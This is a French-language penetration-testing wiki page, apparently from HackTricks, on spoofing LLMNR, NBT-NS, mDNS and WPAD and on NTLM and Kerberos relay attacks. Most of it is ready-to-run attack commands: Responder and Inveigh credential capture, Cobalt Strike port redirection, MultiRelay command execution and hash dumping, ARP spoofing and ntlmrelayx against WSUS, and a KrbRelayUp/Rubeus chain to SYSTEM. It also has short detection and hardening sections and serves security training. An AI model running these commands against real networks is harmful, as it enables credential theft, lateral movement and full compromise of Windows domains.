# Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks

{{#include ../../banners/hacktricks-training.md}}

## Protocoles réseau

### Protocoles de résolution de noms locaux

- **LLMNR, NBT-NS, and mDNS**:
- Microsoft et d'autres systèmes d'exploitation utilisent LLMNR et NBT-NS pour la résolution de noms locale lorsque DNS échoue. De même, Apple et Linux utilisent mDNS.
- Ces protocoles sont susceptibles d'être interceptés et de faire l'objet de spoofing en raison de leur nature non authentifiée et de diffusion (broadcast) sur UDP.
- [Responder](https://github.com/lgandx/Responder) et [Dementor](https://github.com/MatrixEditor/Dementor) peuvent être utilisés pour usurper des services en envoyant des réponses falsifiées aux hôtes interrogeant ces protocoles.
- Plus d'informations sur l'usurpation de services avec Responder sont disponibles [ici](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Web Proxy Auto-Discovery Protocol (WPAD)

- WPAD permet aux navigateurs de découvrir automatiquement les paramètres de proxy.
- La découverte est facilitée via DHCP, DNS, ou en repli via LLMNR et NBT-NS si DNS échoue.
- Responder peut automatiser des attaques WPAD, dirigeant les clients vers des serveurs WPAD malveillants.

### Responder/Dementor pour le poisoning de protocoles

- **Responder** est un outil utilisé pour le poisoning des requêtes LLMNR, NBT-NS et mDNS, répondant sélectivement selon le type de requête, ciblant principalement les services SMB.
- Il est pré-installé dans Kali Linux, configurable via `/etc/responder/Responder.conf`.
- Responder affiche les hashes capturés à l'écran et les enregistre dans le répertoire `/usr/share/responder/logs`.
- Il prend en charge IPv4 et IPv6.
- La version Windows de Responder est disponible [ici](https://github.com/lgandx/Responder-Windows).

- **Dementor** étend les sujets de multicast poisoning et agit également comme fournisseur de services malveillant (incluant le support CUPS RCE)
- La structure générale est similaire à **Responder** avec une configuration plus granulaire. (par défaut ici : [Dementor.toml](https://github.com/MatrixEditor/dementor/blob/master/dementor/assets/Dementor.toml))
- Compatibilité entre **Dementor** et **Responder** : [Compatibility Matrix](https://matrixeditor.github.io/dementor/compat.html)
- Introduction et documentation : [Dementor - Docs](https://matrixeditor.github.io/dementor/intro.html)
- Corrige des problèmes de capture introduits par Responder sur certains protocoles

#### Exécution de Responder

- Pour lancer Responder avec les paramètres par défaut : `responder -I <Interface>`
- Pour des sondages plus agressifs (avec effets secondaires possibles) : `responder -I <Interface> -P -r -v`
- Techniques pour capturer les challenges/réponses NTLMv1 pour un craquage plus facile : `responder -I <Interface> --lm --disable-ess`
- L'usurpation WPAD peut être activée avec : `responder -I <Interface> --wpad`
- Les requêtes NetBIOS peuvent être résolues vers l'IP de l'attaquant, et un proxy d'authentification peut être configuré : `responder.py -I <interface> -Pv`

#### Exécution de Dementor

- Avec les paramètres par défaut : `Dementor -I <interface>`
- Avec les paramètres par défaut en mode analyse : `Dementor -I <interface> -A`
- Downgrade automatique de session NTLM (ESS) : `Dementor -I <interface> -O NTLM.ExtendedSessionSecurity=Off`
- Lancer la session courante avec une config personnalisée : `Dementor -I <interface> --config <file.toml>`

### DHCP Poisoning avec Responder

- Le spoofing des réponses DHCP peut empoisonner de manière permanente les informations de routage d'une victime, offrant une alternative plus discrète à l'ARP poisoning.
- Cela nécessite une connaissance précise de la configuration du réseau cible.
- Pour lancer l'attaque : `./Responder.py -I eth0 -Pdv`
- Cette méthode peut capturer efficacement des hashes NTLMv1/2, mais nécessite une manipulation prudente pour éviter des perturbations réseau.

### Capturer Credentials avec Responder/Dementor

- Responder/Dementor usurpera des services en utilisant les protocoles mentionnés ci‑dessus, capturant credentials (généralement Challenge/Réponse NTLMv2) lorsqu'un utilisateur tente de s'authentifier contre les services spoofés.
- Des tentatives peuvent être faites pour downgrader en NetNTLMv1 ou désactiver ESS pour faciliter le cracking des credentials.

Si vous disposez déjà d'un **partage SMB en écriture que les victimes parcourent**, vous pouvez contraindre un SMB sortant sans spoofing en plantant des fichiers d'appât basés sur UNC (SCF/LNK/library-ms/desktop.ini/Office) générés avec ntlm_theft, puis en interceptant l'authentification avec Responder. Voir le [Explorer-triggered UNC lure workflow](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#writable-smb-share--explorer-triggered-unc-lures-ntlm_theftscflnklibrary-msdesktopini).

Il est crucial de noter que l'utilisation de ces techniques doit se faire légalement et éthiquement, en obtenant les autorisations appropriées et en évitant toute perturbation ou accès non autorisé.

## Inveigh

Inveigh est un outil pour penetration testers et red teamers, conçu pour les systèmes Windows. Il offre des fonctionnalités similaires à Responder, effectuant du spoofing et des attaques man-in-the-middle. L'outil a évolué d'un script PowerShell vers un binaire C#, avec [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) et [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) comme versions principales. Les paramètres détaillés et instructions sont disponibles dans le [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh peut être utilisé via PowerShell:
```bash
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou exécuté en tant que binaire C#:
```bash
Inveigh.exe
```
### NTLM Relay Attack

Cette attaque exploite les sessions d'authentification SMB pour accéder à une machine cible, accordant un shell système si elle réussit. Les prérequis clés incluent :

- L'utilisateur authentifiant doit avoir un accès Local Admin sur l'hôte relayé.
- La signature SMB doit être désactivée.

#### 445 Redirection de port et tunneling

Dans des scénarios où une introduction directe sur le réseau n'est pas possible, le trafic sur le port 445 doit être redirigé et tunnelisé. Des outils comme [**PortBender**](https://github.com/praetorian-inc/PortBender) aident à rediriger le trafic du port 445 vers un autre port, ce qui est essentiel lorsque l'accès Local Admin est disponible pour le chargement de pilotes.

PortBender setup and operation in Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Autres outils pour NTLM Relay Attack

- **Metasploit** : Configurez-le avec proxies, et les détails des hôtes local et distant.
- **smbrelayx** : Un script Python pour relayer des sessions SMB, exécuter des commandes ou déployer des backdoors.
- **MultiRelay** : Un outil de la suite Responder pour relayer des utilisateurs spécifiques ou tous les utilisateurs, exécuter des commandes ou dump hashes.

Chaque outil peut être configuré pour fonctionner via un SOCKS proxy si nécessaire, permettant des attaques même avec un accès réseau indirect.

### Fonctionnement de MultiRelay

MultiRelay s'exécute depuis le répertoire _**/usr/share/responder/tools**_, ciblant des IPs ou des utilisateurs spécifiques.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
Ces outils et techniques forment un ensemble complet pour mener des attaques NTLM Relay dans divers environnements réseau.

### Abusing WSUS HTTP (8530) for NTLM Relay to LDAP/SMB/AD CS (ESC8)

Les clients WSUS s'authentifient auprès de leur serveur de mise à jour en utilisant NTLM sur HTTP (8530) ou HTTPS (8531). Lorsque HTTP est activé, les vérifications périodiques des clients peuvent être forcées ou interceptées sur le segment local et relayées avec ntlmrelayx vers des endpoints LDAP/LDAPS/SMB ou AD CS HTTP (ESC8) sans casser aucun hash. Cela se fond dans le trafic normal de mise à jour et donne fréquemment des authentifications de comptes machine (HOST$).

What to look for
- Configuration GPO/registry sous HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate et ...\WindowsUpdate\AU :
- WUServer (e.g., http://wsus.domain.local:8530)
- WUStatusServer (reporting URL)
- UseWUServer (1 = WSUS; 0 = Microsoft Update)
- DetectionFrequencyEnabled and DetectionFrequency (hours)
- WSUS SOAP endpoints used by clients over HTTP:
- /ClientWebService/client.asmx (approvals)
- /ReportingWebService/reportingwebservice.asmx (status)
- Default ports: 8530/tcp HTTP, 8531/tcp HTTPS

Reconnaissance
- Unauthenticated
- Scanner les services à l'écoute : nmap -sSVC -Pn --open -p 8530,8531 -iL <hosts>
- Renifler le trafic HTTP WSUS via L2 MITM et enregistrer les clients/endpoints actifs avec wsusniff.py (HTTP uniquement à moins de pouvoir faire en sorte que les clients fassent confiance à votre TLS cert).
- Authenticated
- Analyser les GPOs SYSVOL pour les clés WSUS avec MANSPIDER + regpol (wsuspider.sh wrapper summarises WUServer/WUStatusServer/UseWUServer).
- Interroger les endpoints à grande échelle depuis des hôtes (NetExec) ou localement:
nxc smb <ip> -u <user> -p <pass> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

End-to-end HTTP relay steps
1) Se positionner pour un MITM (même L2) afin qu'un client résolve le serveur WSUS vers vous (ARP/DNS poisoning, Bettercap, mitm6, etc.). Exemple avec arpspoof:
arpspoof -i <iface> -t <wsus_client_ip> <wsus_server_ip>

2) Rediriger le port 8530 vers votre relay listener (optionnel, pratique):
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530
iptables -t nat -L PREROUTING --line-numbers

3) Démarrer ntlmrelayx avec l'écouteur HTTP (requires Impacket support for HTTP listener; see PRs below):
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530

Other common targets:
- Relay to SMB (if signing off) for exec/dump: -t smb://<host>
- Relay to LDAPS for directory changes (e.g., RBCD): -t ldaps://<DC>
- Relay to AD CS web enrollment (ESC8) to mint a cert and then authenticate via Schannel/PKINIT:
ntlmrelayx.py --http-port 8530 -t http://<CA>/certsrv/certfnsh.asp --adcs --no-http-server
For deeper AD CS abuse paths and tooling, see the AD CS page:

{{#ref}}
../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
{{#endref}}

4) Déclencher une vérification client ou attendre la planification. Depuis un client:
wuauclt.exe /detectnow
or use the Windows Update UI (Check for updates).

5) Utiliser les sessions SOCKS authentifiées (if -socks) ou les résultats du relais direct pour le post-exploitation (LDAP changes, SMB ops, or AD CS certificate issuance for later authentication).

HTTPS constraint (8531)
- L'interception passive de WSUS via HTTPS est inefficace sauf si les clients font confiance à votre certificat. Sans un certificat de confiance ou autre brèche TLS, le NTLM handshake ne peut pas être capturé/relayé à partir du trafic WSUS HTTPS.

Notes
- WSUS a été annoncé deprecated mais reste largement déployé ; HTTP (8530) est encore courant dans de nombreux environnements.
- Outils utiles : wsusniff.py (observe HTTP WSUS check-ins), wsuspider.sh (enumerate WUServer/WUStatusServer from GPOs), NetExec reg-query at scale.
- Impacket a restauré le support de l'écouteur HTTP pour ntlmrelayx dans PR #2034 (initialement ajouté dans PR #913).

### Force NTLM Logins

Sous Windows vous pouvez être en mesure de forcer certains comptes privilégiés à s'authentifier sur des machines arbitraires. Lisez la page suivante pour apprendre comment :


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

## Kerberos Relay attack

A **Kerberos relay attack** vole un **AP-REQ ticket** depuis un service et le réutilise contre un second service qui partage la **même computer-account key** (parce que les deux SPNs sit on the same `$` machine account). Cela fonctionne même si les classes de service des SPNs diffèrent (e.g. `CIFS/` → `LDAP/`) parce que la key qui décrypte le ticket est le NT hash de la machine, pas la SPN string elle-même et la SPN string ne fait pas partie de la signature.

Unlike NTLM relay, the hop is limited to the *same host* but, if you target a protocol that lets you write to LDAP, you can chain into **Resource-Based Constrained Delegation (RBCD)** or **AD CS enrollment** and pop **NT AUTHORITY\SYSTEM** in a single shot.

For detailed info about this attack check:

- [https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
- [https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/](https://decoder.cloud/2025/04/24/from-ntlm-relay-to-kerberos-relay-everything-you-need-to-know/)

- 1. **Kerberos basics**

| Jeton | Objet | Pertinence pour le relay |
|-------|-------|--------------------------|
| **TGT / AS-REQ ↔ REP** | Prouve l'utilisateur auprès du KDC | non affecté |
| **Service ticket / TGS-REQ ↔ REP** | Lié à un **SPN** ; chiffré avec la clé du propriétaire du SPN | interchangeable si les SPNs partagent le même compte |
| **AP-REQ** | Le client envoie `TGS` au service | **ce que nous volons et réutilisons** |

* Les tickets sont chiffrés avec la **password-derived key du compte qui possède le SPN**.
* L'**Authenticator** à l'intérieur de l'AP-REQ a un timestamp de 5 minutes ; le rejouage dans cette fenêtre est valide jusqu'à ce que le cache du service voie un doublon.
* Windows vérifie rarement si la SPN string dans le ticket correspond au service que vous atteignez, donc un ticket pour `CIFS/HOST` se décrypte normalement sur `LDAP/HOST`.

- 2. **What must be true to relay Kerberos**

1. **Shared key:** les SPNs source et cible appartiennent au même compte machine (comportement par défaut sur les serveurs Windows).
2. **No channel protection:** signature SMB/LDAP désactivée et EPA désactivé pour HTTP/LDAPS.
3. **You can intercept or coerce authentication:** empoisonnement LLMNR/NBNS, DNS spoof, **PetitPotam / DFSCoerce RPC**, faux AuthIP, rogue DCOM, etc..
4. **Ticket source not already used:** vous gagnez la course avant que le paquet réel n'arrive ou le bloquez entièrement ; sinon le replay cache du serveur déclenche l'Event 4649.
5. Vous devez d'une manière ou d'une autre être capable d'effectuer un **MitM dans la communication** — par exemple être membre du groupe DNSAdmins pour modifier le DNS du domaine ou pouvoir modifier le fichier HOSTS de la victime.

### Kerberos Relay Steps

- 3.1 **Reconnaissance de l'hôte**
```powershell
# find servers where HTTP, LDAP or CIFS share the same machine account
Get-ADComputer -Filter * -Properties servicePrincipalName |
Where-Object {$_.servicePrincipalName -match '(HTTP|LDAP|CIFS)'} |
Select Name,servicePrincipalName
```
- 3.2 **Démarrer le relay listener**

[KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
```powershell
# one-click local SYSTEM via RBCD
.\KrbRelayUp.exe relay --spn "ldap/DC01.lab.local" --method rbcd --clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8
```
`KrbRelayUp` regroupe **KrbRelay → LDAP → RBCD → Rubeus → SCM bypass** dans un seul binaire.

- 3.3 **Coerce Kerberos auth**
```powershell
# coerce DC to auth over SMB with DFSCoerce
.\dfscoerce.exe --target \\DC01.lab.local --listener 10.0.0.50
```
DFSCoerce force le DC à nous envoyer un ticket Kerberos `CIFS/DC01`.

- 3.4 **Relayer l'AP-REQ**

KrbRelay extrait le GSS blob depuis SMB, le reconditionne dans un LDAP bind, puis le transmet à `ldap://DC01` — l'authentification réussit parce que la **même clé** le déchiffre.

- 3.5 **Abuser LDAP ➜ RBCD ➜ SYSTEM**
```powershell
# (auto inside KrbRelayUp) manual for clarity
New-MachineAccount -Name "FAKE01" -Password "P@ss123"
KrbRelay.exe -spn ldap/DC01 -rbcd FAKE01_SID
Rubeus s4u /user:FAKE01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:HOST/DC01 /ptt
SCMUACBypass.exe
```
Vous possédez maintenant **NT AUTHORITY\SYSTEM**.


### **Autres chemins importants à connaître**

| Vector | Trick | Why it matters |
|--------|-------|----------------|
| **AuthIP / IPSec** | Un serveur factice envoie une **GSS-ID payload** avec n'importe quel SPN ; le client construit un AP-REQ directement vers vous | Fonctionne même entre sous-réseaux ; machine creds par défaut |
| **DCOM / MSRPC** | Un OXID resolver malveillant force le client à s'authentifier sur un SPN et un port arbitraires | Pure *local* priv-esc ; contourne le pare-feu |
| **AD CS Web Enroll** | Relayer le ticket machine vers `HTTP/CA` et obtenir un certificat, puis **PKINIT** pour mint des TGTs | Contourne les protections de signature LDAP |
| **Shadow Credentials** | Écrire `msDS-KeyCredentialLink`, puis PKINIT avec une paire de clés falsifiée | Pas besoin d'ajouter un compte ordinateur |

### **Dépannage**

| Error | Meaning | Fix |
|-------|---------|-----|
| `KRB_AP_ERR_MODIFIED` | Clé du ticket ≠ clé cible | Mauvais hôte/SPN |
| `KRB_AP_ERR_SKEW` | Horloge > 5 min de décalage | Synchroniser l'heure ou utiliser `w32tm` |
| LDAP bind fails | Signature exigée | Utiliser le chemin AD CS ou désactiver la signature |
| Event 4649 spam | Le service a vu un Authenticator dupliqué | Bloquer ou tenter de devancer le paquet original |


### **Détection**

* Augmentation des **Event 4769** pour `CIFS/`, `HTTP/`, `LDAP/` provenant de la même source en quelques secondes.
* **Event 4649** sur le service indique qu'un replay a été détecté.
* Connexion Kerberos depuis **127.0.0.1** (relay vers le SCM local) est hautement suspecte — cartographier via la règle Sigma dans la doc KrbRelayUp.
* Surveiller les modifications des attributs `msDS-AllowedToActOnBehalfOfOtherIdentity` ou `msDS-KeyCredentialLink`.

## **Durcissement**

1. **Appliquer LDAP & SMB signing + EPA** sur chaque serveur.
2. **Séparer les SPNs** afin que HTTP ne soit pas sur le même compte que CIFS/LDAP.
3. Corriger les vecteurs de coercition (PetitPotam KB5005413, DFS, AuthIP).
4. Définir **`ms-DS-MachineAccountQuota = 0`** pour empêcher les jointures de machines non autorisées.
5. Générer des alertes sur **Event 4649** et les connexions Kerberos en loopback inattendues.



## References

- [HTB: Breach – Writable SMB share lures + Responder capture → NetNTLMv2 crack](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
- [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
- [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
- [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [WSUS Is SUS: NTLM Relay Attacks in Plain Sight (TrustedSec)](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight)
- [GoSecure – Abusing WSUS to enable NTLM relaying attacks](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks)
- [Impacket PR #2034 – Restore HTTP server in ntlmrelayx](https://github.com/fortra/impacket/pull/2034)
- [Impacket PR #913 – HTTP relay support](https://github.com/fortra/impacket/pull/913)
- [WSUScripts – wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py)
- [WSUScripts – wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh)
- [MS-WSUSOD – Windows Server Update Services: Server-to-Client Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft – WSUS deprecation announcement](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)

{{#include ../../banners/hacktricks-training.md}}
